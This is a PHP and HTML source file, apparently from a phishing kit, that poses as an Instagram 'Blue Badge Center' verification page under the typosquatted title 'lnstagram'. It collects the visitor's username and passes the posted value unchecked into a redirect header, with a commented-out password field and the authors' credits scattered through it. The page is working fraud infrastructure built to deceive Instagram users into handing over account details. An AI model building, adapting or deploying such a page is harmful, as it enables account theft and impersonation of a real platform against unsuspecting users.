<?php
//Coded by Lüpen & Pharaben
if($_POST){
$id= $_POST['id'];
header("location: $id");
}
//Coded by Lüpen & Pharaben
function space($our_qen){
for( $i=0;$i<$our_qen;$i++){
	echo "<br>";
}
}
//Coded by Lüpen & Pharaben
?>

<!DOCTYPE html>
<html lang="en">
<head>
	   <title>Blue Badge | lnstagram</title>
	<link rel="stylesheet" href="css/xss1.css">
	<link rel="stylesheet" type="text/css" href="css/xss2.css">
	<link rel="stylesheet" href="css/xss3.css">
	<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<link rel="icon" type="image/png" href="favicon.png"/>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1, user-scalable=no">
<!--===============================================================================================-->
<meta property="og:image" content="https://cdn.imza.com/indirv2/n/800x480/instagram-telif-haklarina-sahip-olan-muzikler-icin-kullanicilari-uyaracak-1590051316.jpg" />
<meta property="og:type" content="website">
<meta property="og:url" content="https://igbluebadgecenter.co.vu/case/">
<meta property="og:title" content="Instagram Blue Badge Center">
<meta property="og:description" content="Create an account or log in to Instagram - A simple, imaginative and creative way to edit photos and videos and share them with your teacher guides.">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>
<body>


	</tr>
</table><br>
<!--
<center>
	<div class="get">
	<span class="main" id="rgb" style="font-size: 30px!important;		width:50%!important;">Copyright Infringement</span>
		<br>
	</div>
</center>
-->
	</header>
<!---->
	<center>
	<div class="home">
		<br><br>
		<div class="mx">
		<br>
		<!--<h1 class="allare">ALL ARE WELCOME</h1>-->
<!--Coded by LÃ¼pen & Pharaben-->
		<div class="wrapper fadeInDown">
		  <div id="formContent">
		    <!-- Tabs Titles -->

		    <!-- Icon -->
		    <div class="fadeIn first">
		      <img src="https://s4.gifyu.com/images/1618350172623f8cf25e172c0a89a.png" width=200 style="border-radius:50%;margin-top:30px;margin-bottom:25px;" align="center">
		    </div>
<!--Coded by LÃ¼pen & Pharaben-->
		    <!-- Login Form -->
<p class="text5">
		<font color="black">	Hello,<img src="image/mavitik.png" width="25"><br>Please enter your instagram username and verify your identity to access the verification form.</p><br>
		    <form autocomplete="off" method="post">
		      <input type="text" id="login" class="fadeIn second" name="id" placeholder="Username">
		      <!--<input type="text" id="password" class="fadeIn third" name="login" placeholder="password">-->

						<center>
							<button type="submit" class="submit">
							<div class="f4x" style="margin-left: 0px;">
								<span class="comm">Next</span>
								</div>
            </button>
           </center>
<!--Coded by L�pen & Pharaben-->
		    </form>

<!--Coded by L�pen & Pharaben-->
		  </div>
		</div>
<br><br><br>
		<br>
</div><!--mx -->

</div>

<br>
</div>
</center>
<!---->
<center>
<!--Coded by Lüpen & Pharaben-->

<!--Coded by Lüpen & Pharaben-->

<!--Coded by Lüpen & Pharaben-->
<br>
<br>


<br>
</center>
</body>
<style type="text/css">
  btn.html("L�tfen bekleyiniz...");
</style>
</html>    
